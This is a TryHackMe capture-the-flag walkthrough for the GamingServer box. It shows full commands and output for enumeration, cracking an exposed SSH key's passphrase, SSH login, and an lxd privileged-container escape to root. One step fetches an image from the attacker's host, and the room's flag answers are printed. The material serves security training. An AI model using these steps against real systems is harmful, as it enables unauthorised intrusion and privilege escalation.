# GamingServer — TryHackMe Walkthrough

> An Easy Boot2Root box for beginners. Can you gain access to this gaming server built by amateurs with no experience of web development and take advantage of the deployment system?

<p align="center">
  <a href="https://imgbb.com/"><img src="https://i.ibb.co/k22w3Vss/80d16a6756c805903806f7ecbdd80f6d.jpg" alt="80d16a6756c805903806f7ecbdd80f6d" border="0"></a>
</p>

<p align="center">
  <a href="https://tryhackme.com/room/gamingserver">
    <img src="https://img.shields.io/badge/TryHackMe-GamingServer-red?logo=tryhackme&logoColor=white">
  </a>
  <img src="https://img.shields.io/badge/Difficulty-Easy-green">
  <img src="https://img.shields.io/badge/Platform-Linux-black">
  <img src="https://img.shields.io/badge/Focus-Web%20Enum%20%7C%20SSH%20Key%20Crack%20%7C%20LXC%20Escape-blue">
</p>

---

## Topics Covered

| # | Topic |
|---|-------|
| 1 | Network Enumeration |
| 2 | Web Enumeration |
| 3 | Web Poking — Page Source and robots.txt |
| 4 | Security Misconfiguration — Exposed SSH Private Key |
| 5 | Brute Forcing SSH Key Passphrase |
| 6 | Privilege Escalation via LXC Container |

---

## Learning Objectives

By the end of this walkthrough, you will be able to:

- Enumerate a web server for hidden directories using Gobuster
- Extract usernames from HTML comments and exposed upload directories
- Download an exposed SSH private key and crack its passphrase using John the Ripper
- Log in via SSH using a private key file
- Identify LXC group membership as a privilege escalation vector
- Build an Alpine Linux container image, mount the host filesystem, and read the root flag

---

## Prerequisites

- Basic familiarity with Linux terminal commands
- Nmap, Gobuster, John the Ripper, and an SSH client installed
- Python HTTP server available to serve files
- Target machine running on TryHackMe (replace `Machine_IP` with your assigned IP)

---

## Task 1 — Boot2Root

---

### Step 1 — Network Enumeration

**Approach:** Run an aggressive Nmap scan to identify all open ports and services.

```
kali@kali:~/CTFs/tryhackme/GamingServer$ sudo nmap -A -Pn -sS -sC -sV -O Machine_IP
[sudo] password for kali:
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-14 10:43 CEST
Nmap scan report for Machine_IP
Host is up (0.065s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 34:0e:fe:06:12:67:3e:a4:eb:ab:7a:c4:81:6d:fe:a9 (RSA)
|   256 49:61:1e:f4:52:6e:7b:29:98:db:30:2d:16:ed:f4:8b (ECDSA)
|_  256 b8:60:c4:5b:b7:b2:d0:23:a0:c7:56:59:5c:63:1e:c4 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: House of danak
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.23 seconds
```

> **Note:** Two ports are open — **SSH on 22** and **HTTP on 80**. The web server title "House of danak" suggests a gaming-themed site. The next step is to explore the web application and look for any exposed files, hidden directories, or developer mistakes.

---

### Step 2 — Web Poking — Page Source and robots.txt

**Approach:** Check the page HTML source for developer comments, then read `robots.txt` for any disclosed paths.

**HTML source comment:**

```
kali@kali:~/CTFs/tryhackme/GamingServer$ curl -s http://Machine_IP | grep "<\!--"
<!-- Website template by freewebsitetemplates.com -->
<!-- john, please add some actual content to the site! lorem ipsum is horrible to look at. -->
```

**robots.txt:**

```
user-agent: *
Allow: /
/uploads/
```

> **Note:** The HTML comment reveals a username — **`john`** — in a developer note left behind in the production site. The `robots.txt` file discloses an `/uploads/` directory. Both are common developer mistakes that expose sensitive information. Always grep page source for HTML comments and always read `robots.txt`.

---

### Step 3 — Browsing the Uploads Directory

**Approach:** Navigate to `http://Machine_IP/uploads/` — the directory listing is enabled, exposing its contents.

```
[ ]     dict.lst        2020-02-05 14:10    2.0K
[TXT]   manifesto.txt   2020-02-05 13:05    3.0K
[IMG]   meme.jpg        2020-02-05 13:32    15K
```

> **Note:** Three files are visible. The most important is **`dict.lst`** — a custom wordlist that will be used to crack the SSH key passphrase later. Download all three with `wget`. The `manifesto.txt` contains lore for the room, and `meme.jpg` is a joke image.

---

### Step 4 — Gobuster Directory Enumeration

**Approach:** Run Gobuster to discover any additional hidden directories on the web server beyond what `robots.txt` revealed.

```
kali@kali:~/CTFs/tryhackme/GamingServer$ gobuster dir -u Machine_IP -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.0.1
===============================================================
[+] Url:            http://Machine_IP
===============================================================
/.hta (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/index.html (Status: 200)
/robots.txt (Status: 200)
/secret (Status: 301)
/server-status (Status: 403)
/uploads (Status: 301)
===============================================================
2020/10/14 10:48:53 Finished
===============================================================
```

> **Note:** A `/secret` directory is discovered. Navigating to `http://Machine_IP/secret/` reveals a file called `secretKey` — an SSH private key. This, combined with the username `john` found in the HTML comments, gives us everything needed to attempt SSH login.

---

### Step 5 — Downloading and Cracking the SSH Private Key

**Approach:** Download the SSH private key, extract its hash using `ssh2john`, and crack it using John the Ripper with the custom wordlist from `/uploads/`.

```
kali@kali:~/CTFs/tryhackme/GamingServer$ wget http://Machine_IP/secret/secretKey
--2020-10-14 10:49:33--  http://Machine_IP/secret/secretKey
Connecting to Machine_IP:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1766 (1.7K)
Saving to: 'secretKey'

secretKey               100%[===============================>]   1.72K  --.-KB/s    in 0s

2020-10-14 10:49:33 (261 MB/s) - 'secretKey' saved [1766/1766]

kali@kali:~/CTFs/tryhackme/GamingServer$ chmod 400 secretKey
kali@kali:~/CTFs/tryhackme/GamingServer$ /usr/share/john/ssh2john.py secretKey > ssh.hash
kali@kali:~/CTFs/tryhackme/GamingServer$ john ssh.hash --wordlist=dict.lst
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
letmein          (secretKey)
1g 0:00:00:00 DONE (2020-10-14 10:50) 33.33g/s 7400p/s 7400c/s 7400C/s
Session completed
```

> **Note:** SSH private keys can be protected with a **passphrase** — an additional layer of security beyond just possessing the key file. `ssh2john.py` converts the key into a hash format that John the Ripper can brute-force. The passphrase cracks as **`letmein`** using the custom `dict.lst` wordlist found in the uploads directory — a deliberate placement by the room creator. The `chmod 400 secretKey` command is required because SSH refuses to use private key files that are group or world readable.

---

### Step 6 — SSH Login and Reading the User Flag

**Approach:** Log in via SSH using the private key and the cracked passphrase.

```
kali@kali:~/CTFs/tryhackme/GamingServer$ ssh -i secretKey john@Machine_IP
The authenticity of host 'Machine_IP' can't be established.
ECDSA key fingerprint is SHA256:LO5bYqjXqLnB39jxUzFMiOaZ1YnyFGGXUmf1edL6R9o.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'Machine_IP' (ECDSA) to the list of known hosts.
Enter passphrase for key 'secretKey':
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-76-generic x86_64)

Last login: Mon Jul 27 20:17:26 2020 from 10.8.5.10
john@exploitable:~$ ls
user.txt
john@exploitable:~$ cat user.txt
a5c2ff8b9c2e3d4fe9d4ff2f1a5a6e7e
```

> **Note:** The hostname `exploitable` is a hint about the machine's intended purpose. The user flag is found immediately in `john`'s home directory.

---

### Question 1 — What is the user flag?

<details>
<summary>Reveal Answer</summary>

**`a5c2ff8b9c2e3d4fe9d4ff2f1a5a6e7e`**

</details>

---

### Step 7 — Privilege Escalation via LXC Container

**Approach:** Check group membership with `id`. If `john` is in the `lxd` group, the machine is vulnerable to LXC container escape. Build an Alpine Linux image on the attack machine, serve it over HTTP, import it on the target, create a privileged container that mounts the host filesystem, and read the root flag from inside the container.

> **Note:** The `lxd` group grants the ability to create and manage LXC containers. A **privileged container** with `security.privileged=true` runs as root on the host. By mounting the entire host filesystem (`source=/ path=/mnt/root`) into the container, root inside the container can read any file on the host — including `/root/root.txt`. This is a well-documented container escape technique.

**Build Alpine image on attack machine (run locally before SSH login):**
```
git clone https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder
sudo ./build-alpine
```

**Serve it over HTTP:**
```
python3 -m http.server 80
```

**On the target — download, import, configure, and exploit:**

```
john@exploitable:~$ wget http://YOUR_IP/lxd-alpine-builder/alpine-v3.12-x86_64-20201014_1053.tar.gz
--2020-10-14 08:56:48--  http://YOUR_IP/lxd-alpine-builder/alpine-v3.12-x86_64-20201014_1053.tar.gz
Connecting to YOUR_IP:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3183829 (3.0M) [application/gzip]

alpine-v3.12-x86_64-2 100%[========================>]   3.04M  1.04MB/s    in 2.9s

john@exploitable:~$ lxc image import ./alpine-v3.12-x86_64-20201014_1053.tar.gz --alias myimage
Image imported with fingerprint: 8f83febe3dd6858c008db1d6ef7327876b93df2f5846489921dcc6
john@exploitable:~$ lxc image list
+---------+--------------+--------+-------------------------------+--------+--------+------------------------------+
|  ALIAS  | FINGERPRINT  | PUBLIC |          DESCRIPTION          |  ARCH  |  SIZE  |         UPLOAD DATE          |
+---------+--------------+--------+-------------------------------+--------+--------+------------------------------+
| myimage | 8f83febe3dd6 | no     | alpine v3.12 (20201014_10:53) | x86_64 | 3.04MB | Oct 14, 2020 at 8:58am (UTC) |
+---------+--------------+--------+-------------------------------+--------+--------+------------------------------+
john@exploitable:~$ lxc init myimage ignite -c security.privileged=true
Creating ignite
john@exploitable:~$ lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
Device mydevice added to ignite
john@exploitable:~$ lxc start ignite
john@exploitable:~$ lxc exec ignite /bin/sh
~ # id
uid=0(root) gid=0(root)
~ # find / -type f -name root.txt 2>/dev/null
/mnt/root/root/root.txt
~ # cat /mnt/root/root/root.txt
2e337b8c9f3aff0c2b3e8d4e6a7c88fc
```

> **Note:** Inside the container, `id` confirms we are root. The host filesystem is accessible at `/mnt/root` — the path we specified when adding the device. The root flag lives at `/mnt/root/root/root.txt` (the first `root` is the mount path, the second is the `/root` home directory on the host). This technique works whenever a user is a member of the `lxd` group, regardless of other security controls.

---

### Question 2 — What is the root flag?

<details>
<summary>Reveal Answer</summary>

**`2e337b8c9f3aff0c2b3e8d4e6a7c88fc`**

</details>

---

## Summary

| Step | Action | Result |
|------|--------|--------|
| 1 | Nmap scan | Found SSH (22) and Apache HTTP (80) |
| 2 | HTML source comment | Discovered username `john` |
| 3 | `robots.txt` | Disclosed `/uploads/` directory |
| 4 | `/uploads/` directory listing | Downloaded `dict.lst` custom wordlist |
| 5 | Gobuster directory scan | Discovered `/secret/` directory |
| 6 | `/secret/secretKey` download | Retrieved SSH private key |
| 7 | `ssh2john` + John the Ripper | Cracked SSH key passphrase → `letmein` |
| 8 | SSH login as `john` | Gained shell access, read `user.txt` |
| 9 | `id` group check | Confirmed `john` is in `lxd` group |
| 10 | Alpine LXC image import + privileged container | Mounted host filesystem at `/mnt/root` |
| 11 | Shell inside container as root | Read `root.txt` from `/mnt/root/root/` |
